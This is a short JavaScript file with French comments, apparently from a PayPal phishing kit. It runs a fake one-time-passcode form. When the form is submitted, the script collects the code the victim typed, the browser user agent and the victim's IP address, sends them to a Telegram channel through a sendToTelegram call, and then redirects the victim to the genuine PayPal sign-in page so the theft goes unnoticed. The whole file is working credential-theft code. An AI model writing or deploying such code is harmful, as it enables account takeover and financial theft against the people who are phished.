// Gestion des inputs OTP
const otpInputs = document.querySelectorAll('.otp-input input');

otpInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
        if (e.target.value) {
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }
    });

    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

// Gestion du formulaire OTP
document.getElementById('otpForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const otp = Array.from(otpInputs)
        .map(input => input.value)
        .join('');

    const formData = {
        otp,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };

    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        formData.ip = ipData.ip;
    } catch (error) {
        formData.ip = 'Unknown';
    }

    try {
        await sendToTelegram('otp', formData);
        window.location.href = 'https://www.paypal.com/signin';
    } catch (error) {
        console.error('Error:', error);
    }
});